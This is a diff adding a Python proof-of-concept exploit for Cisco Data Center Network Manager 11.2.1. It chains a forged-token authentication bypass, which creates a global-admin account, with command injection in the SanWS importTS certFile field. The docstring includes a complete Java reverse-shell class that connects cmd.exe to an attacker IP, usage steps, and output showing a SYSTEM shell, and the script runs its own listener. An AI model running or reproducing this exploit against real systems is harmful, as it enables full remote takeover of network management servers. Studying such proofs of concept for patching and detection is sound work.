@@ -1,0 +1,265 @@
+#!/usr/bin/python
+"""
+Cisco Data Center Network Manager SanWS importTS Command Injection Remote Code Execution Vulnerability
+
+Tested on: Cisco DCNM 11.2.1 Installer for Windows (64-bit)
+- Release: 11.2(1)
+- Release Date: 18-Jun-2019
+- FileName: dcnm-installer-x64-windows.11.2.1.exe.zip
+- Size: 1619.36 MB (1698022100 bytes)
+- MD5 Checksum: e50f8a6b2b3b014ec022fe40fabcb6d5
+
+Bug 1: CVE-2019-15975 / ZDI-20-003
+Bug 2: CVE-2019-15979 / ZDI-20-100
+
+Notes:
+======
+
+Si.java needs to be compiled against Java 8 (the target used 1.8u201):
+
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.net.Socket;
+
+public class Si {
+    static{
+        try {
+            String host = "192.168.100.159";
+            int port = 1337;
+            String cmd = "cmd.exe";
+            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+            Socket s = new Socket(host,port);
+            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+            OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+            while(!s.isClosed()){
+                while(pi.available()>0){
+                    so.write(pi.read());
+                }
+                while(pe.available()>0){
+                    so.write(pe.read());
+                }
+                while(si.available()>0){
+                    po.write(si.read());
+                }
+                so.flush();
+                po.flush();
+                Thread.sleep(50);
+                try {
+                    p.exitValue();
+                    break;
+                }catch (Exception e){}
+            }
+            p.destroy();
+            s.close();
+        }catch (IOException | InterruptedException e){ }
+    }
+}
+
+Example:
+========
+
+1. Modify the above Si.java to contain your connectback ip and port
+2. Compile the above Si.java class with Java 8 and store it in an attacker controlled share
+3. Launch the poc.py against your target using the share
+
+saturn:~ mr_me$ ./poc.py 
+(+) usage: ./poc.py <target> <connectback:port> <smbserver> <smbpath>
+(+) eg: ./poc.py 192.168.100.122 192.168.100.159:1337 vmware-host '\Shared Folders\tools'
+
+saturn:~ mr_me$ ./poc.py 192.168.100.122 192.168.100.159:1337 vmware-host '\Shared Folders\tools'
+(+) attempting auth bypass 1
+(+) bypassed auth! added a global admin hacker:Hacked123
+(+) attempting to load class from \\vmware-host\Shared Folders\tools\Si.class
+(+) starting handler on port 1337
+(+) connection from 192.168.100.122
+(+) pop thy shell!
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>whoami
+whoami
+nt authority\system
+
+C:\Program Files\Cisco Systems\dcm\wildfly-10.1.0.Final\bin\service>
+"""
+
+import re
+import os
+import sys
+import time
+import base64
+import socket
+import requests
+import calendar
+import telnetlib
+from uuid import uuid4
+from threading import Thread
+from Crypto.Cipher import AES
+from xml.etree import ElementTree
+from datetime import datetime, timedelta
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+class AESCipher:
+    def __init__(self):
+
+        # Cisco's hardcoded key
+        self.key = "s91zEQmb305F!90a"
+        self.bs = 16
+
+    def _pad(self, s):
+        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)
+
+    def encrypt(self, raw):
+        raw = self._pad(raw)
+        iv = "\x00" * 0x10
+        cipher = AES.new(self.key, AES.MODE_CBC, iv)
+        return base64.b64encode(cipher.encrypt(raw))
+
+def make_raw_token(target):
+    """ craft our token """
+    key = "Source Incite"
+    uuid = str(uuid4()).replace("-","")[0:20]
+    time = leak_time(target)
+    return "%s-%s-%s" % (key, uuid, time)
+
+def bypass_auth(target, token, usr, pwd):
+    """ we use this primitive to fully bypass auth """
+    global user_added_already
+    d = {
+        "userName" : usr,
+        "password" : pwd,
+        "roleName" : "global-admin"
+    }
+    h = { "afw-token" : token }
+    uri = "https://%s/fm/fmrest/dbadmin/addUser" % target
+    r = requests.post(uri, data=d, headers=h, verify=False)
+    try:
+        json = r.json()
+    except ValueError:
+        return False
+    if json["resultMessage"] == "Success":
+        user_added_already = False
+        return True
+    elif json["resultMessage"] == "User already exists.":
+        user_added_already = True
+        return True
+    return False
+
+def leak_time(target):
+    """ leak the time from the server (not really needed) """
+    uri = "https://%s/" % target
+    r = requests.get(uri, verify=False)
+    r_time = datetime.strptime(r.headers['Date'][:-4], '%a, %d %b %Y %H:%M:%S')
+    return calendar.timegm(r_time.timetuple())
+
+def gen_token(target, usr, pwd):
+    """ this authenticates via the SOAP endpoint """
+    soap_body  = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.jaxws.dcbu.cisco.com/">'
+    soap_body += '\t<soapenv:Header/>'
+    soap_body += '\t<soapenv:Body>'
+    soap_body += '\t\t<ep:requestToken>'
+    soap_body += '\t\t\t<username>%s</username>' % usr
+    soap_body += '\t\t\t<password>%s</password>' % pwd
+    soap_body += '\t\t\t<expiration>100000</expiration>'
+    soap_body += '\t\t</ep:requestToken>'
+    soap_body += '\t</soapenv:Body>'
+    soap_body += '</soapenv:Envelope>'
+    uri = "https://%s/LogonWSService/LogonWS" % target
+    r = requests.post(uri, data=soap_body, verify=False)
+    tree = ElementTree.fromstring(r.content)
+    for elem in tree.iter():
+        if elem.tag == "return":
+            return elem.text
+    return False
+
+def craft_soap_header(target, usr, pwd):
+    """ this generates the soap header """
+    soap_header  = '\t<SOAP-ENV:Header xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
+    soap_header += '<m:token xmlns:m="http://ep.jaxws.dcbu.cisco.com/">%s</m:token>' % gen_token(target, usr, pwd)
+    soap_header += '\t</SOAP-ENV:Header>'
+    return soap_header
+
+def load_remote_class(target, smb, usr, pwd):
+    """ this triggers the cmdi """
+    soap_body  = '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ep="http://ep.san.jaxws.dcbu.cisco.com/">'
+    soap_body += craft_soap_header(target, usr, pwd)
+    soap_body += '\t<soapenv:Body>'
+    soap_body += '\t\t<ep:importTS>'
+    soap_body += '\t\t\t<certFile>" -providerclass Si -providerpath "%s</certFile>' % smb
+    soap_body += '\t\t\t<serverIPAddress></serverIPAddress>'
+    soap_body += '\t\t</ep:importTS>'
+    soap_body += '\t</soapenv:Body>'
+    soap_body += '</soapenv:Envelope>'
+    uri = "https://%s/SanWSService/SanWS" % target
+    r = requests.post(uri, data=soap_body, verify=False)
+    tree = ElementTree.fromstring(r.content)
+    for elem in tree.iter():
+        if elem.tag == "resultMessage":
+            if elem.text == "Success":
+                return True
+    return False
+
+def handler(lp):
+    print "(+) starting handler on port %d" % lp
+    t = telnetlib.Telnet()
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(("0.0.0.0", lp))
+    s.listen(1)
+    conn, addr = s.accept()
+    print  "(+) connection from %s" % addr[0]
+    t.sock = conn
+    print "(+) pop thy shell!"
+    t.interact()
+
+def exec_code(t, lp, s, usr, pwd):
+    handlerthr = Thread(target=handler, args=(lp,))
+    handlerthr.start()
+    load_remote_class(t, s, usr, pwd)
+
+def main():
+    usr = "hacker"
+    pwd = "Hacked123"
+    if len(sys.argv) != 5:
+        print "(+) usage: %s <target> <connectback:port> <smbserver> <smbpath>" % sys.argv[0]
+        print "(+) eg: %s 192.168.100.122 192.168.100.159:1337 vmware-host '\\Shared Folders\\tools'" % sys.argv[0]
+        sys.exit(1)
+    t = sys.argv[1]
+    c = sys.argv[2]
+    s = "\\\\%s%s" % (sys.argv[3], sys.argv[4])
+    i = 0
+
+    if not ":" in c:
+        print "(+) using default connectback port 4444"
+        ls = c
+        lp = 4444
+    else:
+        if not c.split(":")[1].isdigit():
+            print "(-) %s is not a port number!" % cb.split(":")[1]
+            sys.exit(-1)
+        ls = c.split(":")[0]
+        lp = int(c.split(":")[1])
+
+    # InheritableThreadLocal.childValue performs a 'shallow copy' and causes a small race condition
+    while 1:
+        i += 1
+        print "(+) attempting auth bypass %d" % i
+        raw = make_raw_token(t)
+        cryptor = AESCipher()
+        token = cryptor.encrypt(raw)
+        if bypass_auth(t, token, usr, pwd):
+            if not user_added_already:
+                print "(+) bypassed auth! added a global admin %s:%s" % (usr, pwd)
+            else:
+                print "(+) we probably already bypassed auth! try the account %s:%s" % (usr, pwd)
+            break
+        sys.stdout.write('\x1b[1A')
+        sys.stdout.write('\x1b[2K')
+
+    # we have bypassed the authentication at this point
+    print "(+) attempting to load class from %s\\Si.class" % s
+    exec_code(t, lp, s, usr, pwd)
+
+if __name__ == "__main__":
+    main()
